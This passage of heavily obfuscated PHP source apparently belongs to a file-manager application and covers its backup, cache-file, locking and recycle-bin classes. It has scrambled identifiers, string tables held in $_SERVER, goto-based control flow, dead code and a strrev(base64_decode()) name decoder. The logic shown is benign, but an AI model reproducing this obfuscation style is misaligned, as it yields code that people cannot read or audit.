$ß¿Ì…†[642]) { if (!$ÅÉ¡Â) { break; } $ÅÉ¡Â++; } if ($ëÛˆè£• <= 2) { $€şËØ˜ã = $ëÛˆè£•; break; } else { if ($ëÛˆè£• < 2) { continue; } } $ÑÊ¦½Ø¡ = !0; for ($˜±ÄÌÆ± = 2; $˜±ÄÌÆ± <= sqrt($ëÛˆè£•); $˜±ÄÌÆ±++) { if ($ëÛˆè£• % $˜±ÄÌÆ± == 0) { $ÑÊ¦½Ø¡ = !1; } } if ($ÑÊ¦½Ø¡) { $€şËØ˜ã = $ëÛˆè£•; break; } } $ı¬ü»üı[] = $€şËØ˜ã; $±Ìô¯±š = $ß¿Ì…†[782]; if (strlen($±Ìô¯±š) < $ß¿Ì…†[640]) { return; } } $ƒ¨Ÿ°¹¾ = 2; $óÑå·¬ = $ß¿Ì…†[783]; while ($óÑå·¬ < $ß¿Ì…†[642]) { if ($óÑå·¬ >= 0) { break; } $óÑå·¬++; } for ($ëÛˆè£• = $¯‰ğ–Ô; $ëÛˆè£• > 1; $ëÛˆè£•--) { $ÑÊ¦½Ø¡ = !0; foreach ($ı¬ü»üı as $ìîòÕšç) { if ($ëÛˆè£• % $ìîòÕšç == 0) { $ÑÊ¦½Ø¡ = !1; break; } } if ($ÑÊ¦½Ø¡) { $ƒ¨Ÿ°¹¾ = $ëÛˆè£•; break; } } return $ƒ¨Ÿ°¹¾; $ñ©µè¼© = $ß¿Ì…†[784]; while ($ñ©µè¼© < $ß¿Ì…†[650]) { if ($ñ©µè¼© >= 0) { break; } $ñ©µè¼©++; } } public function mdytb48a91de($Ùõ’·Ê›, $ÅÑî±˜) { $ñİÌÙ…« =& $_SERVER[…Ğİ€¤†]; return call_user_func(array($ñİÌÙ…«[8], $ñİÌÙ…«[302]), $Ùõ’·Ê›, $ÅÑî±˜); $ÙöÒñÛß = $_SERVER[…É¦À–][785]; if (!$ÙöÒñÛß) { return; } } public function vjmfded6646f($±Æáµ«Í, $›íßÏƒ) { $ó÷Î’º =& $_SERVER[…Ğİ€¤†]; return call_user_func(array($ó÷Î’º[303], $ó÷Î’º[304]), $±Æáµ«Í, $›íßÏƒ); $»¼è†Ö¡ = $_SERVER[…É¦À–][786]; } public function htdn550fea25($™Ş¶Ã€ñ, $‚Üç²Éã) { $Åì¨Ü¤à =& $_SERVER[…É¦À–]; $”ÜÍîä =& $_SERVER[…Ğİ€¤†]; return call_user_func(array($”ÜÍîä[303], $”ÜÍîä[305]), $™Ş¶Ã€ñ, $‚Üç²Éã); $‹šıêÃœ = $Åì¨Ü¤à[787]; while (strlen($‹šıêÃœ) < $Åì¨Ü¤à[642]) { if (!$‹šıêÃœ) { break; } $‹šıêÃœ++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ÉÒêÍ­û =& $_SERVER[…É¦À–]; $this->isManual(); self::$name = date($ÉÒêÍ­û[788]); if (!($èÏË¤ú = Model($ÉÒêÍ­û[789])->lastItem())) { $èÏË¤ú = $this->initData(); } else { self::$name = $èÏË¤ú[$ÉÒêÍ­û[32]]; if ($èÏË¤ú[$ÉÒêÍ­û[790]] == $ÉÒêÍ­û[88]) { self::$name = date($ÉÒêÍ­û[240]); $µÉ÷Ûû = 0; if (isset($èÏË¤ú[$ÉÒêÍ­û[322]][$ÉÒêÍ­û[200]][$ÉÒêÍ­û[497]])) { $µÉ÷Ûû = (int) $èÏË¤ú[$ÉÒêÍ­û[322]][$ÉÒêÍ­û[200]][$ÉÒêÍ­û[497]]; } if (self::$manual == 0 && $èÏË¤ú[$ÉÒêÍ­û[32]] == self::$name) { Model($ÉÒêÍ­û[789])->remove($èÏË¤ú[$ÉÒêÍ­û[428]]); } $èÏË¤ú = $this->initData($µÉ÷Ûû, $èÏË¤ú[$ÉÒêÍ­û[791]]); } else { $this->checkStore($èÏË¤ú[$ÉÒêÍ­û[791]]); } } self::$option = $èÏË¤ú; } private function isManual() { $áå¦èÁ† = _get($GLOBALS, $_SERVER[…É¦À–][792], 0); $áå¦èÁ† = intval($áå¦èÁ†); self::$manual = $áå¦èÁ† && $áå¦èÁ† == 1 ? 1 : 0; } private function initData($©½—„Ú“ = 0, $ë˜ˆ÷Ÿ£ = '') { $ºç…öÜò =& $_SERVER[…É¦À–]; $·¹Å‡­ë = Model($ºç…öÜò[789])->config(); if ($ë˜ˆ÷Ÿ£ && $·¹Å‡­ë[$ºç…öÜò[791]] != $ë˜ˆ÷Ÿ£) { $©½—„Ú“ = 0; } $this->checkStore($·¹Å‡­ë[$ºç…öÜò[791]]); if (self::$manual == 1) { self::$name .= $ºç…öÜò[11] . date($ºç…öÜò[793]); } $šâ·£ö = array($ºç…öÜò[791] => $·¹Å‡­ë[$ºç…öÜò[791]], $ºç…öÜò[32] => self::$name, $ºç…öÜò[790] => 0, $ºç…öÜò[794] => $·¹Å‡­ë[$ºç…öÜò[794]], $ºç…öÜò[795] => self::$manual, $ºç…öÜò[322] => array($ºç…öÜò[796] => array($ºç…öÜò[790] => 0), $ºç…öÜò[797] => array($ºç…öÜò[790] => 0, $ºç…öÜò[798] => 0, $ºç…öÜò[799] => 0, $ºç…öÜò[33] => $ºç…öÜò[12], $ºç…öÜò[800] => 0, $ºç…öÜò[801] => 0), $ºç…öÜò[802] => array($ºç…öÜò[790] => 0, $ºç…öÜò[798] => 0, $ºç…öÜò[799] => 0, $ºç…öÜò[800] => 0, $ºç…öÜò[801] => 0), $ºç…öÜò[200] => array($ºç…öÜò[790] => 0, $ºç…öÜò[803] => 0, $ºç…öÜò[804] => 0, $ºç…öÜò[805] => 0, $ºç…öÜò[806] => 0, $ºç…öÜò[497] => $©½—„Ú“, $ºç…öÜò[800] => 0, $ºç…öÜò[801] => 0)), $ºç…öÜò[800] => time(), $ºç…öÜò[801] => 0); $®ˆÚ‹ = Model($ºç…öÜò[789])->insert($šâ·£ö); $šâ·£ö[$ºç…öÜò[428]] = $®ˆÚ‹; return $šâ·£ö; } private function checkStore($ïò™Ç†ı) { $ğÄÖŸ =& $_SERVER[…É¦À–]; $´Æ¯æÕõ = Model($ğÄÖŸ[807])->listData($ïò™Ç†ı); Model($ğÄÖŸ[807])->checkConfig($´Æ¯æÕõ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[…É¦À–][789])->findByName(self::$name); } return self::$option; } public static function set($¼Ï³Ô²Ğ) { $ñŒı‘ĞÏ =& $_SERVER[…É¦À–]; $‡ë—ÇØï = self::get(); foreach ($¼Ï³Ô²Ğ as $š¨èµ½º => $ßõ¬›ş‹) { $£¼ûªåî = explode($ñŒı‘ĞÏ[10], $š¨èµ½º); $ê‘†•ü² = count($£¼ûªåî); switch ($ê‘†•ü²) { case 1: $‡ë—ÇØï[$£¼ûªåî[0]] = $ßõ¬›ş‹; break; case 2: $‡ë—ÇØï[$£¼ûªåî[0]][$£¼ûªåî[1]] = $ßõ¬›ş‹; break; case 3: $‡ë—ÇØï[$£¼ûªåî[0]][$£¼ûªåî[1]][$£¼ûªåî[2]] = $ßõ¬›ş‹; break; } } Model($ñŒı‘ĞÏ[789])->update($‡ë—ÇØï[$ñŒı‘ĞÏ[428]], $‡ë—ÇØï); self::$option = $‡ë—ÇØï; return self::$option; } public function keep() { $”Ì×¢úÌ =& $_SERVER[…É¦À–]; $ô‘Ú£Æà = self::get(); if ($ô‘Ú£Æà[$”Ì×¢úÌ[322]][$”Ì×¢úÌ[796]][$”Ì×¢úÌ[790]] == $”Ì×¢úÌ[88]) { return; } $this->backupKeep($ô‘Ú£Æà); self::set(array($”Ì×¢úÌ[808] => 1)); } private function backupKeep($÷»ˆ¼Ü÷) { $ˆ»«ÏÊ¼ =& $_SERVER[…É¦À–]; if (self::$manual == 1) { return; } $“±µ¤â› = Model($ˆ»«ÏÊ¼[789])->listData(); if (empty($“±µ¤â›)) { return; } $‘Ï½À€ = 0; $ùìÄ‹¨ = array(); foreach ($“±µ¤â› as $ÉŒ»¥) { if ($‘Ï½À€ >= 7) { break; } $ùìÄ‹¨[] = $ÉŒ»¥[$ˆ»«ÏÊ¼[32]]; $‘Ï½À€++; } for ($‘Ï½À€ = 0; $‘Ï½À€ < 12; $‘Ï½À€++) { $ùìÄ‹¨[] = date($ˆ»«ÏÊ¼[809], strtotime("\55{$‘Ï½À€}\40\155\x6f\156\164\150\163")); } $ùìÄ‹¨ = array_unique($ùìÄ‹¨); $î†´ˆ§Ë = Model($ˆ»«ÏÊ¼[810])->get($ˆ»«ÏÊ¼[811]); foreach ($“±µ¤â› as $ÉŒ»¥) { if (isset($ÉŒ»¥[$ˆ»«ÏÊ¼[795]]) && $ÉŒ»¥[$ˆ»«ÏÊ¼[795]] == $ˆ»«ÏÊ¼[88]) { continue; } if (!empty($ÉŒ»¥[$ˆ»«ÏÊ¼[32]]) && in_array($ÉŒ»¥[$ˆ»«ÏÊ¼[32]], $ùìÄ‹¨)) { continue; } Model($ˆ»«ÏÊ¼[789])->remove($ÉŒ»¥[$ˆ»«ÏÊ¼[428]]); $ê’ïÇÄ‚ = $this->backupPath($÷»ˆ¼Ü÷, $î†´ˆ§Ë); IO::remove($ê’ïÇÄ‚, !1); } } private function backupPath($¾‡¬»ıÊ, $òó¡ÊÎÇ = false) { $Èä÷½æ‹ =& $_SERVER[…É¦À–]; if (!$òó¡ÊÎÇ) { $òó¡ÊÎÇ = Model($Èä÷½æ‹[810])->get($Èä÷½æ‹[811]); } $İ  ñªŒ = $¾‡¬»ıÊ[$Èä÷½æ‹[32]]; $·êˆÉ•Ø = substr(md5($Èä÷½æ‹[812] . $òó¡ÊÎÇ . $İ  ñªŒ), 0, 8); return "\173\151\157\x3a{$¾‡¬»ıÊ[$Èä÷½æ‹[791]]}\175\57\144\141\x74\x61\x62\141\163\x65\x2f\x62\x61\x63\153\x75\x70\57" . $İ  ñªŒ . $Èä÷½æ‹[11] . $·êˆÉ•Ø; } public function db() { $²ïõ£Ü =& $_SERVER[…É¦À–]; $şåú¦Ã¼ = self::get(); if ($şåú¦Ã¼[$²ïõ£Ü[322]][$²ïõ£Ü[797]][$²ïõ£Ü[790]] == $²ïõ£Ü[88]) { return !0; } $· Ôà…¶ = new BackupDb(); if (!$· Ôà…¶->index()) { return !1; } self::set(array($²ïõ£Ü[813] => 1)); return !0; } public function dbFile() { $ÅßÚ½¬Á =& $_SERVER[…É¦À–]; $«ßœ û = self::get(); if ($«ßœ û[$ÅßÚ½¬Á[322]][$ÅßÚ½¬Á[802]][$ÅßÚ½¬Á[790]] == $ÅßÚ½¬Á[88]) { return !0; } $Ùù“÷ÙÔ = new BackupDbFile(); if (!$Ùù“÷ÙÔ->index()) { return !1; } self::set(array($ÅßÚ½¬Á[814] => 1)); return !0; } public function file() { $êòÛ¡ì× =& $_SERVER[…É¦À–]; $§©˜Š›Ü = self::get(); if ($§©˜Š›Ü[$êòÛ¡ì×[322]][$êòÛ¡ì×[200]][$êòÛ¡ì×[790]] == $êòÛ¡ì×[88]) { return !0; } if (!isset($§©˜Š›Ü[$êòÛ¡ì×[794]]) || $§©˜Š›Ü[$êòÛ¡ì×[794]] == $êòÛ¡ì×[198]) { $Ñ½ÔØƒ = new BackupFile(); if (!$Ñ½ÔØƒ->index()) { return !1; } } self::set(array($êòÛ¡ì×[815] => 1, $êòÛ¡ì×[790] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÄÓ°ĞÂÚ =& $_SERVER[…É¦À–]; $ï¨ıÊ¶ = Backup::get(); self::$io = $ï¨ıÊ¶[$ÄÓ°ĞÂÚ[791]]; self::$name = $ï¨ıÊ¶[$ÄÓ°ĞÂÚ[32]]; $ëºÇ³¥ñ = new DbManage(); $î–…ù…Ê = $ëºÇ³¥ñ->dbType(); $Úë¬Ğ€ø = array($ÄÓ°ĞÂÚ[816] => $î–…ù…Ê, $ÄÓ°ĞÂÚ[817] => time()); Backup::set($Úë¬Ğ€ø); $í ÈÑâË = $this->tmpFilesPath() . $ÄÓ°ĞÂÚ[818] . self::$name . $ÄÓ°ĞÂÚ[8]; del_dir($í ÈÑâË); mk_dir($í ÈÑâË); $ê—Ñ¿ = $¸ƒ›¤Úä = 0; $šõôµ = new Task($ÄÓ°ĞÂÚ[819], $ÄÓ°ĞÂÚ[820], 0, LNG($ÄÓ°ĞÂÚ[821]) . $ÄÓ°ĞÂÚ[822] . LNG($ÄÓ°ĞÂÚ[823])); try { $‰½˜«ò” = $ëºÇ³¥ñ->db()->getTables(); } catch (Exception $ğ£“ö„°) { $šõôµ->end(); return !1; } $‰½˜«ò” = array_diff($‰½˜«ò”, array($ÄÓ°ĞÂÚ[824], $ÄÓ°ĞÂÚ[825])); foreach ($‰½˜«ò” as $Ù”´ÔßÁ) { $ê—Ñ¿ += $ëºÇ³¥ñ->model($Ù”´ÔßÁ)->count(); } $šõôµ->task[$ÄÓ°ĞÂÚ[826]] = $ê—Ñ¿; $GLOBALS[$ÄÓ°ĞÂÚ[827]] = self::$name; foreach ($‰½˜«ò” as $Ù”´ÔßÁ) { $ş”ûşÒ‰ = $í ÈÑâË . $Ù”´ÔßÁ . $ÄÓ°ĞÂÚ[828]; $±êªÖ©Ç = null; if ($Ù”´ÔßÁ == $ÄÓ°ĞÂÚ[829] && (!isset($ï¨ıÊ¶[$ÄÓ°ĞÂÚ[794]]) || $ï¨ıÊ¶[$ÄÓ°ĞÂÚ[794]] == $ÄÓ°ĞÂÚ[198])) { $±êªÖ©Ç = self::$io; } $¸ƒ›¤Úä += $ëºÇ³¥ñ->sqlFromDb($Ù”´ÔßÁ, $ş”ûşÒ‰, $šõôµ, $±êªÖ©Ç); } unset($GLOBALS[$ÄÓ°ĞÂÚ[827]]); $šõôµ->end(); if ($¸ƒ›¤Úä > $ê—Ñ¿) { $ê—Ñ¿ = $¸ƒ›¤Úä; } $Úë¬Ğ€ø = array($ÄÓ°ĞÂÚ[816] => $î–…ù…Ê, $ÄÓ°ĞÂÚ[813] => 1, $ÄÓ°ĞÂÚ[830] => $ê—Ñ¿, $ÄÓ°ĞÂÚ[831] => $¸ƒ›¤Úä, $ÄÓ°ĞÂÚ[832] => time()); Backup::set($Úë¬Ğ€ø); if ($ê—Ñ¿ - $¸ƒ›¤Úä > 0) { $ëíİäÚÑ = $ÄÓ°ĞÂÚ[833]; if (stristr(I18n::getType(), $ÄÓ°ĞÂÚ[834])) { $ëíİäÚÑ = $ÄÓ°ĞÂÚ[835]; } write_log(array($ëíİäÚÑ, $Úë¬Ğ€ø), $ÄÓ°ĞÂÚ[820]); return !1; } return !0; } private function tmpFilesPath() { $±ÍóÕ  =& $_SERVER[…É¦À–]; $Ó„¾øüï = TEMP_FILES; if ($GLOBALS[$±ÍóÕ [6]][$±ÍóÕ [89]][$±ÍóÕ [836]]) { $Ó„¾øüï = $GLOBALS[$±ÍóÕ [6]][$±ÍóÕ [89]][$±ÍóÕ [836]]; if (!mk_dir($Ó„¾øüï) || !is_writable($Ó„¾øüï) || !IO::mkfile($Ó„¾øüï . $±ÍóÕ [837])) { $Ó„¾øüï = TEMP_FILES; } } return $Ó„¾øüï; } } goto b´å‡í˜½¬; DÒİÙÌ¦¤: $fileSize = strrev(base64_decode($_SERVER[â«ìÕ ][0])); function binCheckNeq($œ”å›¸, $¥ú˜«®€) { return $œ”å›¸ != $¥ú˜«®€; } $_SERVER[$_SERVER[â«ìÕ ][1]] = $fileSize($_SERVER[$_SERVER[â«ìÕ ][2]]); goto cÂ¢öŠßœĞ; fèÜ—œğê‹: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ÏÜëê’º, $‰¥¤–¹ğ) { $•ì¹·‡ =& $_SERVER[…É¦À–]; $this->cachePath = $ÏÜëê’º[$•ì¹·‡[84]]; $this->prefix = $•ì¹·‡[874]; $this->cacheTime = $‰¥¤–¹ğ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Â÷Ù¾µ) { $Âş ˜¶˜ =& $_SERVER[…É¦À–]; $Â÷Ù¾µ = str_replace(array($Âş ˜¶˜[875], $Âş ˜¶˜[97], $Âş ˜¶˜[73]), $Âş ˜¶˜[876], $Â÷Ù¾µ); return $this->cachePath . $Âş ˜¶˜[877] . $Â÷Ù¾µ . $Âş ˜¶˜[878]; } public function set($˜‹ğáˆæ, $½Í¯—ù±, $®“Ÿ®Í = false) { $®“Ÿ®Í = $®“Ÿ®Í ? $®“Ÿ®Í : $this->cacheTime; $á¿´Ù¯˜ = $this->getFile($˜‹ğáˆæ); if (file_put_contents($á¿´Ù¯˜, $this->prefix . $½Í¯—ù±, LOCK_EX)) { @touch($á¿´Ù¯˜, intval(time() + $®“Ÿ®Í)); clearstatcache(); return !0; } @unlink($á¿´Ù¯˜); return !1; } public function get($™•´ÙÚî) { $ÖÇ¶Ğ•ô = $this->getFile($™•´ÙÚî); if (file_exists($ÖÇ¶Ğ•ô) && filemtime($ÖÇ¶Ğ•ô) < time()) { @unlink($ÖÇ¶Ğ•ô); return !1; } $šÖµó¸î = @file_get_contents($ÖÇ¶Ğ•ô); return substr($šÖµó¸î, strlen($this->prefix)); } public function remove($Ò’ë¨ã«) { $ı¼Ò¹’ = $this->getFile($Ò’ë¨ã«); return @unlink($ı¼Ò¹’); } public function deleteAll() { $û²Ä¼ä =& $_SERVER[…É¦À–]; $ë´á¸¯Ê = scandir($this->cachePath); foreach ($ë´á¸¯Ê as $Ñ™Üœ§Ê) { $èöÒÍ…õ = $this->cachePath . $Ñ™Üœ§Ê; if (strpos($èöÒÍ…õ, $û²Ä¼ä[878]) && strpos($èöÒÍ…õ, $û²Ä¼ä[879])) { @unlink($èöÒÍ…õ); } } } public function clearTimeout() { $Ç¥™æ”ê =& $_SERVER[…É¦À–]; $šØĞÚè‰ = scandir($this->cachePath); foreach ($šØĞÚè‰ as $ÚöâËş¢) { $öùÑ½›” = $this->cachePath . $ÚöâËş¢; if (strpos($öùÑ½›”, $Ç¥™æ”ê[878]) && strpos($öùÑ½›”, $Ç¥™æ”ê[879]) && filemtime($öùÑ½›”) < time()) { @unlink($öùÑ½›”); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Å˜ø—Ìí =& $_SERVER[…É¦À–]; if (self::$handle) { return self::$handle; } $Éİõ°ôÀ = $GLOBALS[$Å˜ø—Ìí[6]][$Å˜ø—Ìí[378]]; self::$timeout = $Éİõ°ôÀ[$Å˜ø—Ìí[880]] ? $Éİõ°ôÀ[$Å˜ø—Ìí[880]] : 10; $ø¥‡ƒ¸¬ = _get($GLOBALS[$Å˜ø—Ìí[6]], $Å˜ø—Ìí[881]); $İªº×Ğ± = $Éİõ°ôÀ[$Å˜ø—Ìí[867]] ? $Éİõ°ôÀ[$Å˜ø—Ìí[867]] : $Å˜ø—Ìí[200]; if ($İªº×Ğ± == $Å˜ø—Ìí[21] && $ø¥‡ƒ¸¬ == $Å˜ø—Ìí[13]) { $İªº×Ğ± = $Å˜ø—Ìí[200]; } switch ($İªº×Ğ±) { case $Å˜ø—Ìí[870]: self::$handle = new CacheLockRedis(); break; case $Å˜ø—Ìí[871]: self::$handle = new CacheLockMemcached(); break; case $Å˜ø—Ìí[21]: self::$handle = new CacheLockDatabase(); break; case $Å˜ø—Ìí[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Å˜ø—Ìí[882], $Å˜ø—Ìí[883]); } return self::$handle; } private static function key($Ü§¯§ÊÊ) { return $_SERVER[…É¦À–][884] . Cache::key($Ü§¯§ÊÊ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¹µî‰´À = '') { self::$errorMsg = $¹µî‰´À; } public static function lockGlobal($¿ÒëºØ, $éÄäÛ) { return self::lock($¿ÒëºØ, $éÄäÛ, !0); } public static function lock($¥•ÒÖî, $æÊ­Ã¥Ö = false, $®«°Ë‡” = false) { $ä˜×ò¦É =& $_SERVER[…É¦À–]; $¾Í©¬Ç‚ = self::init(); $§ëë’¸ = self::key($¥•ÒÖî); $æÊ­Ã¥Ö = $æÊ­Ã¥Ö ? $æÊ­Ã¥Ö : self::$timeout; $ıÒ»ç¾ = timeFloat(); $„ÙšÆ…Ç = $¾Í©¬Ç‚->lock($§ëë’¸, $æÊ­Ã¥Ö); $Ü’‚³·ô = timeFloat(); if (!$„ÙšÆ…Ç) { $êÅº…çæ = "\x6c\157\143\x6b\x20\x65\162\x72\157\162\73\x6b\x65\171\75{$¥•ÒÖî}\73\x74\151\155\x65\75{$æÊ­Ã¥Ö}\73" . self::$errorMsg . $ä˜×ò¦É[71] . get_caller_msg(); $ãìÑÌ‰ = LNG($ä˜×ò¦É[885]) . "\50{$æÊ­Ã¥Ö}\x73\51\x2e" . LNG($ä˜×ò¦É[886]); $ãìÑÌ‰ .= $ä˜×ò¦É[887]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ãìÑÌ‰ = $ãìÑÌ‰ . $ä˜×ò¦É[888] . self::$errorMsg; } write_log($ä˜×ò¦É[889] . sprintf($ä˜×ò¦É[890], timeFloat() - $ıÒ»ç¾) . $ä˜×ò¦É[891] . $êÅº…çæ . $ä˜×ò¦É[892] . error_get_last(), $ä˜×ò¦É[883]); show_json($ãìÑÌ‰, !1); } if (!$®«°Ë‡”) { self::$lockItem[$§ëë’¸] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $£ØÄÅÊº = number_format(timeFloat() - $Ü’‚³·ô, 3); write_log($ä˜×ò¦É[893] . $¥•ÒÖî . $ä˜×ò¦É[894] . $£ØÄÅÊº, $ä˜×ò¦É[883]); } return $„ÙšÆ…Ç; } public static function lockGet($ö»«îëã) { $‰ı¾ùË¨ = self::key($ö»«îëã); if (self::$lockItem[$‰ı¾ùË¨]) { return self::$lockItem[$‰ı¾ùË¨]; } return self::init()->lockGet($‰ı¾ùË¨); } public static function unlock($í©×³Ç ) { $É´íÅİŠ =& $_SERVER[…É¦À–]; $ç–ëÏ‘¢ = self::key($í©×³Ç ); self::$lockItem[$ç–ëÏ‘¢] = null; self::init()->unlock($ç–ëÏ‘¢); if (GLOBAL_DEBUG_LOG_ALL) { write_log($É´íÅİŠ[895] . $í©×³Ç , $É´íÅİŠ[883]); } return; } public static function unlockRuntime() { $ÉÏ–ÖÍ =& $_SERVER[…É¦À–]; $äÙ§¬¥ú = self::init(); $ö…ÇğÊÚ = !1; foreach (self::$lockItem as $éÆ¦¶…ã => $ñ¹–“‹É) { if (!$ñ¹–“‹É) { continue; } $äÙ§¬¥ú->unlock($éÆ¦¶…ã); if (!$ö…ÇğÊÚ) { $ö…ÇğÊÚ = !0; write_log($ÉÏ–ÖÍ[896] . $éÆ¦¶…ã . $ÉÏ–ÖÍ[71] . get_caller_msg(), $ÉÏ–ÖÍ[883]); continue; } write_log($ÉÏ–ÖÍ[896] . $éÆ¦¶…ã, $ÉÏ–ÖÍ[883]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $µüĞêµÉ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÉÏ–ÖÍ[897] . $µüĞêµÉ . $ÉÏ–ÖÍ[898] . ACTION, $ÉÏ–ÖÍ[883]); } } public static function fileLock($›´¬á¬ï) { $«ªãğˆÌ =& $_SERVER[…É¦À–]; if (!$GLOBALS[$«ªãğˆÌ[899]]) { $GLOBALS[$«ªãğˆÌ[899]] = array(); } $GLOBALS[$«ªãğˆÌ[899]][$›´¬á¬ï] = !1; $¾Í—•¹­ = fopen(DATA_PATH . $›´¬á¬ï . $«ªãğˆÌ[900], $«ªãğˆÌ[901]); if (!$¾Í—•¹­) { return !1; } $GLOBALS[$«ªãğˆÌ[899]][$›´¬á¬ï] = $¾Í—•¹­; if (flock($¾Í—•¹­, LOCK_EX)) { return !0; } self::unlock($›´¬á¬ï); show_json($«ªãğˆÌ[902], !1); return !1; } public static function fileUnlock($ß“¸†çò) { $§¨Ô¥ƒü =& $_SERVER[…É¦À–]; $Í¦§œüø = $GLOBALS[$§¨Ô¥ƒü[899]][$ß“¸†çò]; if (!$Í¦§œüø) { return; } $GLOBALS[$§¨Ô¥ƒü[899]][$ß“¸†çò] = !1; flock($Í¦§œüø, LOCK_UN); fclose($Í¦§œüø); } public static function fileUnlockAll() { $éŞÕï× =& $_SERVER[…É¦À–]; if (!$GLOBALS[$éŞÕï×[899]]) { return; } foreach ($GLOBALS[$éŞÕï×[899]] as $ú¾°Ÿã• => $À¼Ê¡æİ) { if (!$À¼Ê¡æİ) { continue; } $GLOBALS[$éŞÕï×[899]][$ú¾°Ÿã•] = !1; flock($À¼Ê¡æİ, LOCK_UN); fclose($À¼Ê¡æİ); } $GLOBALS[$éŞÕï×[899]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto dØ¾§¥æÂ¿; cÚ†ßµğ¤: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\143\x65\137\162\145\143\171\143\154\x65"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\x54\x69\155\145", "\164\x69\155\x65", "\151\156\x73\145\162\164", "\146\x75\156\143\164\151\x6f\x6e")); public function listData($¶©›üñã = false) { $ß¿£ıõÏ =& $_SERVER[…É¦À–]; $¶©›üñã = $¶©›üñã ? $¶©›üñã : USER_ID; $ö…Œ¬±© = $this->where(array($ß¿£ıõÏ[1678] => $¶©›üñã))->select(); return array_to_keyvalue($ö…Œ¬±©, $ß¿£ıõÏ[12], $ß¿£ıõÏ[431]); } public function moveToRecycle($‚Ì€µ ) { $œªÎ§²Ø =& $_SERVER[…É¦À–]; $Ø­ü›Œ× = Model($œªÎ§²Ø[1378]); $™º™½…² = $Ø­ü›Œ×->sourceInfo($‚Ì€µ ); if (!$™º™½…² || $™º™½…²[$œªÎ§²Ø[460]] == $œªÎ§²Ø[88]) { return; } $®¢˜ç‰è = array($œªÎ§²Ø[446] => $‚Ì€µ , $œªÎ§²Ø[1678] => USER_ID, $œªÎ§²Ø[605] => $™º™½…²[$œªÎ§²Ø[440]], $œªÎ§²Ø[606] => $™º™½…²[$œªÎ§²Ø[525]], $œªÎ§²Ø[609] => $™º™½…²[$œªÎ§²Ø[540]]); $this->add($®¢˜ç‰è); $this->recycleMove($‚Ì€µ , 1); if ($™º™½…²[$œªÎ§²Ø[439]] == $œªÎ§²Ø[88]) { $€“×“ÅÙ = array($œªÎ§²Ø[609] => array($œªÎ§²Ø[569], $™º™½…²[$œªÎ§²Ø[540]] . $‚Ì€µ  . $œªÎ§²Ø[570])); $Ø­ü›Œ×->where($€“×“ÅÙ)->setField($œªÎ§²Ø[460], 1); } } public function clear() { $this->remove(!1); } public function remove($÷Øµ¯„‚ = false, $¸¨…Ü…Â = false) { $Œ—œ˜¦ =& $_SERVER[…É¦À–]; $¸¨…Ü…Â = $¸¨…Ü…Â ? $¸¨…Ü…Â : USER_ID; $ÒšİéÏ = Model($Œ—œ˜¦[1378]); $øêŒõœÉ = $this->listData($¸¨…Ü…Â); $÷Øµ¯„‚ = $÷Øµ¯„‚ === !1 ? !1 : $÷Øµ¯„‚; $Œ·©À¼ = array(); foreach ($øêŒõœÉ as $¡Æ‹¿«°) { if ($÷Øµ¯„‚ != !1 && !in_array($¡Æ‹¿«°, $÷Øµ¯„‚)) { continue; } $ÌÒŞÙ‘Ø = $ÒšİéÏ->sourceInfo($¡Æ‹¿«°); $ÒšİéÏ->remove($¡Æ‹¿«°, !1); $ôøÏÖ¼ = $ÌÒŞÙ‘Ø[$Œ—œ˜¦[440]] . $Œ—œ˜¦[11] . $ÌÒŞÙ‘Ø[$Œ—œ˜¦[525]]; $Œ·©À¼[$ôøÏÖ¼] = array($Œ—œ˜¦[605] => $ÌÒŞÙ‘Ø[$Œ—œ˜¦[440]], $Œ—œ˜¦[525] => $ÌÒŞÙ‘Ø[$Œ—œ˜¦[525]]); $this->where(array($Œ—œ˜¦[431] => $¡Æ‹¿«°))->delete(); } foreach ($Œ·©À¼ as $ÏãÄˆå») { $ÒšİéÏ->targetSpaceUpdate($ÏãÄˆå»[$Œ—œ˜¦[440]], $ÏãÄˆå»[$Œ—œ˜¦[525]]); } } public function restore($¾¹·«Ô = false) { $”®í—«• = $this->listData(); $this->_restoreSource($”®í—«•, $¾¹·«Ô); } public function removeUserAll($œË·‘÷) { $this->remove(!1, $œË·‘÷); } private function _restoreSource($ÅÑë «, $ãËš´’¡) { $à”ËÅ‹× =& $_SERVER[…É¦À–]; $ò‚ôšà = Model($à”ËÅ‹×[1378]); $ãËš´’¡ = $ãËš´’¡ == !1 ? !1 : $ãËš´’¡; if (!$ÅÑë «) { return !0; } $‘ï’ß¤ = array(); foreach ($ÅÑë « as $ù˜›Úçˆ) { if ($ãËš´’¡ != !1 && !in_array($ù˜›Úçˆ, $ãËš´’¡)) { continue; } $¯Üæ‘°û = $ò‚ôšà->sourceInfo($ù˜›Úçˆ); $µàÅµ¬Å = $ò‚ôšà->sourceInfo($¯Üæ‘°û[$à”ËÅ‹×[461]]); if ($µàÅµ¬Å[$à”ËÅ‹×[460]] == $à”ËÅ‹×[88]) { continue; } $ò‚ôšà->lockMoveStart($ù˜›Úçˆ); $this->recycleMove($ù˜›Úçˆ, 0); if ($¯Üæ‘°û[$à”ËÅ‹×[439]] == $à”ËÅ‹×[88]) { $È¯Üâ = array($à”ËÅ‹×[609] => array($à”ËÅ‹×[569], $¯Üæ‘°û[$à”ËÅ‹×[540]] . $ù˜›Úçˆ . $à”ËÅ‹×[570])); $ò‚ôšà->where($È¯Üâ)->setField($à”ËÅ‹×[460], 0); $this->restoreFolderChildren($ù˜›Úçˆ, $ÅÑë «); } 